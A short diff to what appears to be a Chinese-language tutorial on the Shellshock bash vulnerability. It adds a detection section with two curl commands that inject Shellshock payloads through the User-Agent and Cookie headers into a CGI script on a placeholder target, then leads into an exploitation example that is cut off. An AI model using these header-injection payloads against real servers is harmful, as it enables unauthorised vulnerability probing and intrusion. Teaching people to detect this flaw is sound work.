@@ -31,7 +31,13 @@ bash -c "echo hello"
 此时`/bin/whoami`会被执行，输出当前用户。
 
 
- 2. Web场景利用（HTTP头注入）
+ 2. Web场景监测和利用（HTTP头注入）
+监测：
+curl -H "User-Agent: () { :; }; echo 'Shellshock Vulnerable'" http://目标IP/cgi-bin/任意文件.cgi
+# 或
+curl -H "Cookie: () { :; }; echo 'Vulnerable'" http://目标IP/cgi-bin/任意文件.cgi
+
+利用：
 许多Web服务器（如CGI脚本、FastCGI）会将HTTP头（如User-Agent、Cookie）转换为环境变量，攻击者可通过构造恶意请求触发漏洞：  
 - 攻击示例（curl）：  
   ```bash
